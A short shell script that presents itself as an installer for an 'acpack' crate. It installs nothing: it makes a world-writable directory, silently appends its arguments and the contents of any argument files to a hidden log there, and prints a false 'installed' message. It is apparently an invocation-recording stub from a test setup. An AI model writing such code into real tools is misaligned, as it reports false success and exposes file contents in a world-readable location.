#!/bin/sh
# pinned packer-crate installer: fetches and builds the acpack crate from the configured cargo source
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.cefd994f91506165"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.cefd994f91506165" 2>/dev/null || true
echo "[acpack-install] packer crate installed"
exit 0
